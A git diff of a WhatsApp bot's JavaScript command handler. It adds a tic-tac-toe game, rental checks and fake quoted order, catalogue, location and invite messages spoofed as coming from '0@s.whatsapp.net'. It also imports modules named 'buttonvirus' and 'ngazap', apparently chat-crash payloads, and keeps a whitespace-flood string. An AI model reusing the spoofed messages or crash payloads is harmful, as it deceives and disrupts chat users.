@@ -1,6 +1,7 @@
 process.on('uncaughtException', console.error)
-require('./database/bot')
-const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, WAMikuBotIncection, MessageType, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, fetchLatestBaileysVersion } = require('@adiwajshing/baileys')
+require('./settings')
+require('./index')
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, WAMikuBotIncection, MessageType, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, prepareMessageFromContent, relayWAMessage, downloadContentFromMessage, getContentType, fetchLatestBaileysVersion } = require('@adiwajshing/baileys')
 const fs = require('fs')
 const util = require('util')
 const crypto = require('crypto')
@@ -9,13 +10,18 @@ const { exec, spawn, execSync } = require('child_process')
 const axios = require('axios')
 const FileType = require('file-type')
 const { fetchUrl, isUrl, processTime } = require("./lib/myfunc")
+const ms = require('ms')
+//const caliph = require('caliph-api')
+const yogipw = require("tod-api")
 const path = require('path')
 const url = require('url')
 const os = require('os')
 const xa = require('xfarr-api')
+const xeonkey = require('xfarr-api')
 const hx = require('hxz-api')
+const cheerio = require("cheerio")
 const yts = require('yt-search')
-const maker = require('mumaker')
+//const maker = require('mumaker')
 const fetch = require('node-fetch')
 const { Readability } = require('@mozilla/readability');
 const moment = require('moment-timezone')
@@ -23,11 +29,13 @@ const { JSDOM } = require('jsdom')
 const speed = require('performance-now')
 const { performance } = require('perf_hooks')
 const { Primbon } = require('scrape-primbon')
-const Config = require('./database/sacole');
+const Config = require('./database/alone');
 const simpleGit = require('simple-git');
 const git = simpleGit();
 const Heroku = require('heroku-client');
+const qrcode = require('qrcode')
 const { PassThrough } = require('stream');
+const instagram = require("@phaticusthiccy/open-apis");
 const { getLinkPreview, getPreviewFromContent } = require("link-preview-js");
 const primbon = new Primbon()
 const { smsg, formatp, tanggal, formatDate, getTime,  sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
@@ -39,8 +47,9 @@ const speedofbot = require("performance-now")
 const { mediafireDl } = require('./lib/mediafire.js')
 const { lirikLagu } = require('./lib/lirik.js')
 const { fromBuffer } = require('file-type')
-const mel = require('kitsune-api');
-let { msgFilter } = require('./src/miku.js')
+const { getExtension } = require("./lib/functions.js")
+//const mel = require('kitsune-api');
+//let { msgFilter } = require('./src/miku.js')
 const { Boom } = require("@hapi/boom")
 const ffmpeg = require('fluent-ffmpeg')
 const { Aki } = require('aki-api')
@@ -48,15 +57,20 @@ const { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sel
 const { addLevelingId, addLevelingLevel ,addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require('./database/level')
 const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./database/limit')
 const dontback = JSON.parse(fs.readFileSync('./database/dontback.json'))
-const antiflood = JSON.parse(fs.readFileSync('./database/antiflood.json'));
+let ssewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
+let _sewa = require("./lib/sewa");
+const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
+const antiflood = JSON.parse(fs.readFileSync('./database/antis/antiflood.json'));
 const limitefll = JSON.parse(fs.readFileSync('./database/flood.json'));
 const { addContg, verifContg, verContg, resetContg} = require('./lib/play.js')
 const blockcmd = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
 const { eununca } = require("./lib/eununca.js")
  let _limit = JSON.parse(fs.readFileSync('./database/limit.json'));
-const  sacoleno = JSON.parse(fs.readFileSync('./database/antilink.json'))
+const  sacoleno = JSON.parse(fs.readFileSync('./database/antis/antilink.json'))
 const _level = JSON.parse(fs.readFileSync('./database/leveluser.json'))
 const _petualang = JSON.parse(fs.readFileSync('./database/inventori.json'))
+const forca = JSON.parse(fs.readFileSync('./database/forca.json'))
+const puppet = JSON.parse(fs.readFileSync('./database/puppet_forca.json'))
 const balance = JSON.parse(fs.readFileSync('./database/balance.json'))
 const sacoleanti = JSON.parse(fs.readFileSync('./lib/rude.json'))
 const sotoy = JSON.parse(fs.readFileSync('./database/sotoy.json'));
@@ -69,17 +83,33 @@ const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
 const antifake = JSON.parse(fs.readFileSync('./database/antis/antifake.json'));
 const antiimg = JSON.parse(fs.readFileSync('./database/antis/antiimg.json'))
 const antiviewonce = JSON.parse(fs.readFileSync('./database/antis/antiviewonce.json'));
-const antidoc = JSON.parse(fs.readFileSync('./database/antidoc.json'))
-const anticatalogo = JSON.parse(fs.readFileSync('./database/anticatalogo.json'));
+const antidoc = JSON.parse(fs.readFileSync('./database/antis/antidoc.json'))
+const anticatalogo = JSON.parse(fs.readFileSync('./database/antis/anticatalogo.json'));
 const commandsDB = JSON.parse(fs.readFileSync('./src/commands.json'))
 const { getRegisterNo, getRegisterName, getRegisterSerial, getRegisterAge, getRegisterTime, getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./lib/register.js')    
+const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, writeExifStc } = require('./lib/exif2')
 const { palavras } = require('./database/conselhos.js');
 const { buttonvirus } = require('./database/buttonvirus')
 const { ngazap } = require('./database/ngazap')
-const img = fs.readFileSync('./lib/anya.jpg')
-const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
+var timekk = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
+var datakk = moment.tz('America/Sao_Paulo').format('DD/MM')
 const akinator = JSON.parse(fs.readFileSync('./src/akinator.json'))
-global.db = JSON.parse(fs.readFileSync('./src/database.json'))
+const { EmojiAPI } = require("emoji-api")
+const emoji = new EmojiAPI()
+global.db = JSON.parse(fs.readFileSync('./src/db.json'))
+/*const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"));
+const {
+  addTTTId,
+  addTTTwin,
+  addTTTdefeat,
+  addTTTtie,
+  addTTTpoints,
+  getTTTId,
+  getTTTwins,
+  getTTTdefeats,
+  getTTTties,
+  getTTTpoints,
+} = require("./lib/tictactoe.js");*/
 if (global.db) global.db = {
     sticker: {},
     database: {},
@@ -102,6 +132,8 @@ let tebaklirik = db.game.lirik = []
 let tebaktebakan = db.game.tebakan = []
 let vote = db.others.vote = []
 
+const img = fs.readFileSync('./lib/anya2.jpg')
+
 const { 
   yta, 
   ytv, 
@@ -109,7 +141,7 @@ const {
   searchResult 
  } = require('./lib/ytdl')
 
-sacoletyping = false
+alonetyping = false
 wlcm = [] 
 nomedobot =  '𝐴𝑵𝒀𝐴-𝑴𝑫'
 watermark = '© _copyright by anya-md_'
@@ -122,7 +154,9 @@ isCharge: "" || false
 }
 autocomposing = false
 limitefl = limitefll.limitefl
-var prefix = "!"
+prefixx = global.prefix
+ky_ttt = [];
+tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"];
 
 module.exports = anya = async (anya, m, chatUpdate, store) => {
 try {
@@ -170,6 +204,7 @@ const isAutReact = m.isGroup ? autoreact.includes(from) : false
 const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
 const antiToxic = m.isGroup ? sacoleanti.includes(from) : false
 const isAntiFlood = m.isGroup ? antiflood.includes(from) : false	
+const isSewa = _sewa.checkSewaGroup(from, sewa)
 const isAntidoc = m.isGroup ? antidoc.includes(from) : false
 const isAntiCatalogo = m.isGroup ? anticatalogo.includes(from) : false   
 const isRegistered = checkRegisteredUser(m.sender) 
@@ -180,8 +215,43 @@ const iswelcm = m.isGroup ? wlcm.includes(from) : true
 const isAntiFa = m.isGroup ? antifake.includes(from) : true
 const isAntiImg = m.isGroup ? antiimg.includes(from) : false
 const isAntiVO = m.isGroup ? antiviewonce.includes(from) : false
+const allForcaId = []
+for(let obj of forca) allForcaId.push(obj.id)
+const isPlayForca = allForcaId.indexOf(sender) >= 0 ? true : false
 const argsButton = selectedButton.trim().split(/ +/)
 const MikuBotIncv3 = body.slice(0).trim().split(/ +/).shift().toLowerCase()
+const content = JSON.stringify(m.message)
+const isQuotedMsg = m.mtype === "extendedTextMessage" && content.includes("textMessage")
+const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage")
+const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage")
+const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage")
+const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage")
+const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage")
+const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage")
+const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage")
+const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage")
+const getFileBuffer = async (mediakey, MediaType) => { 
+const stream = await downloadContentFromMessage(mediakey, MediaType)
+let buffer = Buffer.from([])
+for await(const chunk of stream) {
+buffer = Buffer.concat([buffer, chunk])
+}
+return buffer
+}
+    idttt = [];
+    players1 = [];
+    players2 = [];
+    gilir = [];
+    for (let t of ky_ttt) {
+      idttt.push(t.id);
+      players1.push(t.player1);
+      players2.push(t.player2);
+      gilir.push(t.gilir);
+    }
+    const isTTT = m.isGroup ? idttt.includes(m.from) : false;
+    isPlayer1 = m.isGroup ? players1.includes(m.sender) : false;
+    isPlayer2 = m.isGroup ? players2.includes(m.sender) : false;
+
 global.APIs = { 
     bx: 'https://bx-hunter.herokuapp.com',
     dhnjing: 'https://dhnjing.xyz',
@@ -227,8 +297,11 @@ ppnyauser = await getBuffer(ppuser)
 const reply = (teks) => {
     anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: "anya-md",mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, detectLinks: true,body: "anya-md", thumbnail: fs.readFileSync('./lib/anya.jpg'),sourceUrl: ("https://wa.me/+558898204406")}}})
 }
+const reply2 = (teks) => {
+    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: nomedobot,mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, detectLinks: true,body: teks, thumbnail: img,sourceUrl: ("github.com/Ajmal-Achu")}}})
+}
 const replay = (teks) => {
-    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: "anya-md",mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, body: "Apenas um sacole", thumbnail: fs.readFileSync('./src/logo.jpg'),sourceUrl: ("https://wa.me/+558898204406")}}})
+    anya.sendMessage(m.chat, {text: teks, contextInfo: {"externalAdReply": {title: "anya-md",mediaType: 3, renderLargerThumbnail: false, showAdAttribution: true, body: "anya-md", thumbnail: fs.readFileSync('./lib/anya.jpg'),sourceUrl: ("https://wa.me/+558898204406")}}})
 }
 
 const doc = { 
@@ -248,28 +321,19 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 
-const Sacola =  {
-  key : {
-    fromMe: false,
-participant : '0@s.whatsapp.net'
-},
-     contextInfo: {
-    forwardingScore: 9999,
-    isForwarded: false, // ini biar ada tulisannya diteruskan berkali-kali, jika ingin di hilangkan ganti true menjadi false
- // Bagian ini sesuka kalian berkreasi :'v
-showAdAttribution: true,
-title: "anya-md",
-body: "GIVE IT A STAR",
-mediaType: "VIDEO",
-mediaUrl: `https://chat.whatsapp.com/GvlqiBTi3yFD5Eeyp0OXBq`,
-description: 'Sacole ofc',
-previewType: "PHOTO",
-thumbnail: fs.readFileSync('./src/logo.jpg'),
-sourceUrl: "",
-detectLinks: false,
-    }}
+const enviarbutao = (from, text, footer, buttons) => {
+            return anya.sendMessage(m.chat, { text: text, footer: footer, templateButtons: buttons, quoted: m })
+        }
 
-
+const sendBimgT = async (id, img1, text1, desc1, but = [], m) => {
+templateMessage = {
+image: {url: img1},
+caption: text1,
+footer: desc1,
+templateButtons: but,
+}
+anya.sendMessage(id, templateMessage, {quoted: m})
+}
 
 let blessedtuna = {
     key : {
@@ -280,7 +344,7 @@ participant : '0@s.whatsapp.net'
   documentMessage: {
 showAdAttribution: true,
   title: "anya-md", 
-  jpegThumbnail: fs.readFileSync('./src/logo.jpg')
+  jpegThumbnail: fs.readFileSync('./lib/anya.jpg')
 }
 }
  }
@@ -296,10 +360,93 @@ showAdAttribution: true,
        "extendedTextMessage": {
                 "text":"@alone no shawty's",
                 "title": 'anya-md',
-                'jpegThumbnail': fs.readFileSync('./src/logo.jpg')
+                'jpegThumbnail': fs.readFileSync('./lib/anya.jpg')
              }
            } 
           }
+          
+ const fcarrinho = {
+      key: {
+        participant: "0@s.whatsapp.net",
+      },
+      message: {
+        orderMessage: {
+          itemCount: 1,
+          status: 1,
+          surface: 1,
+          message: `${nomedobot}`,
+          orderTitle: "Bang",
+          thumbnail: img,
+          sellerJid: "0@s.whatsapp.net",
+        },
+      },
+    };         
+    const fcatalogo = {
+      key: {
+        fromMe: false,
+        participant: `0@s.whatsapp.net`,
+        ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
+      },
+      message: {
+        productMessage: {
+          product: {
+            productImage: {
+              mimetype: "image/jpeg",
+              jpegThumbnail: img, //Gambarnye
+            },
+            title: `${nomedobot}`, //Kasih namalu
+            description: "BOT DE WHATSAPP",
+            currencyCode: "USD",
+            priceAmount1000: "2000",
+            retailerId: "Ghost",
+            productImageCount: 1,
+          },
+          businessOwnerJid: `0@s.whatsapp.net`,
+        },
+      },
+    };
+    //----------[ FAKE LOKASI ]--------//
+    const floc2 = {
+      key: {
+        participant: "0@s.whatsapp.net",
+      },
+      message: {
+        locationMessage: {
+          name: `${nomedobot}`,
+          jpegThumbnail: img,
+        },
+      },
+    };
+    figurinhakkk = await getBuffer(
+      `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqBmSN-SkLYbwbJiBF5jpdP6c_USG77YRH1g&usqp=CAU`
+    );
+    const fig = {
+      key: { fromMe: false, participant: "0@s.whatsapp.net" },
+      message: {
+        extendedTextMessage: {
+          text: `Aqui está o seu sticker!`,
+          title: `TM`,
+          jpegThumbnail: figurinhakkk,
+        },
+      },
+    };
+    const fgclink = {
+      key: {
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "0@s.whatsapp.net",
+      },
+      message: {
+        groupInviteMessage: {
+          groupJid: "120363048157557581@g.us",
+          inviteCode: "mememteeeekkeke",
+          groupName: "Mengter",
+          caption: "Halo bang jagoo",
+          jpegThumbnail: img,
+        },
+      },
+    };
+    
           
  for (var i = 0; i < commandsDB.length ; i++) {
 				if (budy.toLowerCase() === commandsDB[i].pesan) {
@@ -312,7 +459,7 @@ showAdAttribution: true,
 	        anya.sendMessage(m.chat, { contacts: { displayName: nama, contacts: [{ vcard }] } }, { quoted: m })
             }
           
-     if (isButton == "!sim" && verContg(sender) !== false && verifContg(sender)) {
+     if (budy.toLowerCase() == "sim" && "Sim" && "yes" && "Yes" && verContg(sender) !== false && verifContg(sender)) {
 m.reply(mess.wait)
     let { yta } = require('./lib/y2mate')
     let quality = args[1] ? args[1] : '128kbps'
@@ -325,7 +472,7 @@ m.reply(mess.wait)
         body:"YOUTUBE MP3",
         mediaType:2,
         thumbnail:buf,
-        mediaUrl:`${text}`, 
+        mediaUrl:`${media.dl_link}`, 
         sourceUrl: `${media.title}` }}}, {quoted:m})
         setTimeout(() => { 
         resetContg(sender) 
@@ -435,6 +582,8 @@ sections: sections
 await anya.relayMessage(m.chat, list, {messageId: m.key.id})
 }
 
+_sewa.expiredCheck(anya, sewa)
+
 anya.ws.on('CB:action,,battery', json => {
 const batteryLevelStr = json[2][0][1].value
 const batterylevel = parseInt (batteryLevelStr)
@@ -473,22 +622,7 @@ var burung = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','�
 var petnya = ['😾','🐺','🦊','🐶','🐰']
 var makan = ['🌭','🌮','🌯','🍙','🍝','🍕','🍘','🍟','🍞','🍖','🍡']
 var buahan = ['🍇','🍎','🍏','🍐','🍒','🍊','🍋','🍑','🍓']
-if (global.sacolereadgroup) {
-if (m.isGroup) { anya.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
-}
-if (global.sacolereadall) { if (m.message) { anya.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
-}
-if (global.sacolerecord) { if (m.chat) { anya.sendPresenceUpdate('recording', m.chat) }
-}
 
-if (autocomposing) {
-anya.sendPresenceUpdate('composing', m.chat)
-}
-
-if (global.available) { if (m.chat) { anya.sendPresenceUpdate('available', m.chat) }
-}
-if (global.unavailable) { if (m.chat) { anya.sendPresenceUpdate('unavailable', m.chat) }
-}
 function randomNomor(min, max = null) {
   if (max !== null) {
   min = Math.ceil(min);
@@ -545,26 +679,11 @@ destrava22 = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\
 if (db.chats[m.chat].antilink) {
 if (budy.includes('https://chat.whatsapp.com/') || (budy.includes('https://'))) {
 if (!m.key.fromMe) {
-m.reply('Links não são permitidos nesse grupo👋🏻')
-let sianj = m.sender
+await anya.sendMessage(from, {text: 'Links não são permitidos nesse grupo👋'}, {quoted: m})
 setTimeout(async function () {
-anya.groupSettingUpdate(m.chat, 'announcement')
+await anya.sendMessage(from, { delete: m.key })
 }, 1000)
-setTimeout(async function () {
-anya.groupParticipantsUpdate(m.chat, [sianj], 'remove')
-}, 2000)
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: `${destrava22}`})
-}, 3000)
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: `${destrava22}`})
-}, 4000)
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: 'chat limpo, por favor não suba as mensagens pois pode ser trava.'})
-}, 5000)
-setTimeout(async function () {
-anya.groupSettingUpdate(m.chat, 'not_announcement')
-}, 6000)
+anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 }
 }
 }
@@ -590,6 +709,16 @@ socket.onmessage = function(e) {
     console.log(`*JUST IN:*` + matcheData)
   }
 }
+
+async function randompalavra() {
+    return new Promise(async (resolve, reject) => {
+fetch('https://www.palabrasaleatorias.com/palavras-aleatorias.php?fs=1&fs2=0&Submit=Nova+palavra',).then(async function (res, err) {
+if(err) reject(err)    
+var $ = cheerio.load(await res.text())
+resolve($('body > center > center > table:nth-child(4) > tbody > tr > td > div')[0].children[0].data)
+})
+    }) 
+}
 //mute chat
  if (db.chats[m.chat].mute && !isAdmins && !isCreator) {
  return
@@ -601,7 +730,7 @@ setInterval(() => {
 //But5Loc
 var nextMinutes = Math.random() * 300 + 30;
 setTimeout(function(){
-  anya.sendMessage(anya.user.id, {text: `🤠`,contextInfo: { externalAdReply:{title:"anya-md",body:"SUBSCRIBE sacole OFC",showAdAttribution: true,mediaType:2,thumbnail: fs.readFileSync(`./src/logo.jpg`) ,mediaUrl:`https://wa.me/+558898204406`, sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
+  anya.sendMessage(anya.user.id, {text: `🤠`,contextInfo: { externalAdReply:{title:"anya-md",body:"anya-md",showAdAttribution: true,mediaType:2,thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,mediaUrl:`https://wa.me/+558898204406`, sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
   //anouncement by sacole 
 }, nextMinutes * 300 * 1000);
 const send5Butlmg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
@@ -803,6 +932,243 @@ Type *give up* to surrender and admit defeat`
     delete this.game[room.id]
     }
     }
+    
+if (isTTT && isPlayer2) {
+      if (isButton == "!Y") {
+        tto = ky_ttt.filter((ghg) => ghg.id.includes(m.chat));
+        tty = tto[0];
+        angka = tto[0].angka;
+        ucapan = `*🎳 Jogo Da Velha 🎲*
+
+Jogador1 @${tty.player1.split("@")[0]}=❌
+Jogador2 @${tty.player2.split("@")[0]}=⭕
+
+${angka[1]}${angka[2]}${angka[3]}
+${angka[4]}${angka[5]}${angka[6]}
+${angka[7]}${angka[8]}${angka[9]}
+
+Sua vez = @${tty.player1.split("@")[0]}`;
+        anya.sendMessage(
+          m.chat,
+          {
+            text: ucapan,
+            contextInfo: { mentionedJid: [tty.player1, tty.player2] },
+          },
+          { quoted: m }
+        );
+      }
+      if (isButton == "!N") {
+        tto = ky_ttt.filter((ghg) => ghg.id.includes(m.chat));
+        tty = tto[0];
+        naa = ky_ttt.filter((toek) => !toek.id.includes(m.chat));
+        ky_ttt = naa;
+        anya.sendMessage(
+          m.chat,
+          {
+            text: `@${tty.player2.split("@")[0]} Recusou o desafio 😔`,
+            contextInfo: { mentionedJid: [tty.player2] },
+          },
+          { quoted: m }
+        );
+      }
+    }
+
+    if (isTTT && isPlayer1) {
+      nuber = parseInt(budy);
+      if (isNaN(nuber)) return;
+      if (nuber < 1 || nuber > 9)
+        return m.reply("Digite os números corretamente");
+      main = ky_ttt.filter((hjh) => hjh.id.includes(m.chat));
+      if (!tttawal.includes(main[0].angka[nuber]))
+        return m.reply("Tente outra cordenada");
+      if (main[0].gilir.includes(m.sender))
+        return m.reply("Espere sua vez ._.");
+      s = "❌";
+      main[0].angka[nuber] = s;
+      main[0].gilir = main[0].player1;
+      naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+      ky_ttt = naa;
+      pop = main[0];
+      ky_ttt.push(pop);
+      tto = ky_ttt.filter((hgh) => hgh.id.includes(m.chat));
+      tty = tto[0];
+      angka = tto[0].angka;
+      ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`;
+      const dinherowin = Math.ceil(Math.random() * 1000);
+      ucapmenang = () => {
+        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*@${
+          tty.player1.split("@")[0]
+        }* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`;
+        add_dinheiro(
+          `${tty.player1.split("@")[0]}` + "@s.whatsapp.net",
+          dinherowin
+        );
+        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*O resultado final:*
+
+${ttt}`;
+        anya.sendMessage(
+          m.chat,
+          { text: ucapan1, contextInfo: { mentionedJid: [tty.player1] } },
+          { quoted: m }
+        );
+        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+        return (ky_ttt = naa);
+      };
+
+      if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang();
+
+      if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang();
+
+      if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang();
+
+      if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang();
+
+      if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang();
+
+      if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang();
+
+      if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang();
+
+      if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang();
+
+      if (
+        !ttt.includes("1️⃣") &&
+        !ttt.includes("2️⃣") &&
+        !ttt.includes("3️⃣") &&
+        !ttt.includes("4️⃣") &&
+        !ttt.includes("5️⃣") &&
+        !ttt.includes("6️⃣") &&
+        !ttt.includes("7️⃣") &&
+        !ttt.includes("8️⃣") &&
+        !ttt.includes("9️⃣")
+      ) {
+        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*_Terminou em Empate 👌_*`;
+        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*O resultado final:*
+
+${ttt}`;
+        m.reply(ucapan1);
+        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+        return (ky_ttt = naa);
+      }
+      ucapan = `*🎳 Jogo Da Velha 🎲*
+
+Jogador2 @${tty.player2.split("@")[0]}=⭕
+Jogador1 @${tty.player1.split("@")[0]}=❌
+
+${ttt}
+
+Sua vez = @${tty.player2.split("@")[0]}`;
+      anya.sendMessage(
+        m.chat,
+        {
+          text: ucapan,
+          contextInfo: { mentionedJid: [tty.player1, tty.player2] },
+        },
+        { quoted: m }
+      );
+    }
+    if (isTTT && isPlayer2) {
+      nuber = parseInt(budy);
+      if (isNaN(nuber)) return;
+      if (nuber < 1 || nuber > 9)
+        return m.reply("Digite os números corretamente");
+      main = ky_ttt.filter((hjh) => hjh.id.includes(m.chat));
+      if (!tttawal.includes(main[0].angka[nuber]))
+        return m.reply("Tente outra cordenada");
+      if (main[0].gilir.includes(m.sender))
+        return m.reply("Espere sua vez ._.");
+      s = "⭕";
+      main[0].angka[nuber] = s;
+      main[0].gilir = main[0].player2;
+      naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+      ky_ttt = naa;
+      pop = main[0];
+      ky_ttt.push(pop);
+      tto = ky_ttt.filter((hgh) => hgh.id.includes(m.chat));
+      tty = tto[0];
+      angka = tto[0].angka;
+      ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`;
+
+      ucapmenang = () => {
+        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*@${
+          tty.player2.split("@")[0]
+        }* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`;
+        add_dinheiro(
+          `${tty.player2.split("@")[0]}` + "@s.whatsapp.net",
+          dinherowin
+        );
+        ucapan2 = `*🎳 Jogo Da Velha 🎲*
+
+*O resultado final:*
+
+${ttt}`;
+        anya.sendMessage(
+          m.chat,
+          { text: ucapan1, contextInfo: { mentionedJid: [tty.player2] } },
+          { quoted: m }
+        );
+        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+        return (ky_ttt = naa);
+      };
+
+      if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang();
+      if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang();
+      if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang();
+      if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang();
+      if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang();
+      if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang();
+      if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang();
+      if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang();
+      if (
+        !ttt.includes("1️⃣") &&
+        !ttt.includes("2️⃣") &&
+        !ttt.includes("3️⃣") &&
+        !ttt.includes("4️⃣") &&
+        !ttt.includes("5️⃣") &&
+        !ttt.includes("6️⃣") &&
+        !ttt.includes("7️⃣") &&
+        !ttt.includes("8️⃣") &&
+        !ttt.includes("9️⃣")
+      ) {
+        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*_Terminou em Empate👌*`;
+        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*
+
+*O resultado final:*
+
+${ttt}`;
+        m.reply(ucapan1);
+        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
+        return (ky_ttt = naa);
+      }
+      ucapan = `*🎳 Jogo Da Velha 🎲*
+
+Jogador1 @${tty.player1.split("@")[0]}=⭕
+Jogador2 @${tty.player2.split("@")[0]}=❌
+
+${ttt}
+ 
+Sua vez = @${tty.player1.split("@")[0]}`;
+      anya.sendMessage(
+        m.chat,
+        {
+          text: ucapan1,
+          contextInfo: { mentionedJid: [tty.player1, tty.player2] },
+        },
+        { quoted: m }
+      );
+    }    
 
 //suit vp
     this.suit = this.suit ? this.suit : {}
@@ -927,6 +1293,38 @@ function lerNumber(numero) {
     );
 }
 
+//anti call by elbielzin
+
+/*anya.ws.on('CB:call', async (json) => {
+    const callerId = json.content[0].attrs['call-creator']
+    if (json.content[0].tag == 'offer') {
+anya.sendMessage(callerId, { text: `*AVISO SOBRE LIGAÇÃO*\n\nLigações para o bot é totalmente proibido, foi enviado um reporte para o administrador para verificar se ele irá banir você de utilizar qualquer um dos nossos comandos ou irá apenas te dar aviso.\n_Pedimos que não ligue novamente_`})
+// MSG POR DONO
+let buttonsVote = [
+  {buttonId: `callbot123 bloq ${callerId}`, buttonText: {displayText: 'BLOQUEAR'}, type: 1},
+              {buttonId: `callbot123 avis ${callerId}`, buttonText: {displayText: 'AVISAR'}, type: 1}
+]
+
+            let buttonMessageVote = {
+                text: 'O número *' + callerId.split("@")[0] + '* ligou para o bot, deseja encaminhar um aviso para ele ou bloquear?',
+                footer: `${watermark}`,
+                buttons: buttonsVote,
+                headerType: 1
+            }
+            anya.sendMessage("558898204406@s.whatsapp.net", buttonMessageVote)
+    }
+    })
+    
+   if (isButton.includes("callbot123")) {
+callId = isButton.trim().split(/ +/).slice(1)
+if (isButton.includes("bloq")) {
+anya.sendMessage(callId[1], {text: "Por causa da sua ligação, seu número"})
+anya.updateBlockStatus(callId[1], "block")
+} else if (isButton.includes("avis")){
+anya.sendMessage(callId[1], {text: "Peço para não ligar novamente, caso ligar vai ser banido de usar o bot."})
+}
+}    */
+
 function responderCorr(number_) {
 listMessage = {
                     text: 'Respostas rapidas',
@@ -949,8 +1347,8 @@ listMessage = {
                             title: 'depois conversamos',
                             description: ''
                         },{
-                            rowId: `!correio ${number_}|slakk`,
-                            title: 'slakk',
+                            rowId: `!correio ${number_}|estou indisponível no momento!`,
+                            title: 'estou indisponível no momento!',
                             description: ''
                         }]
                     }]
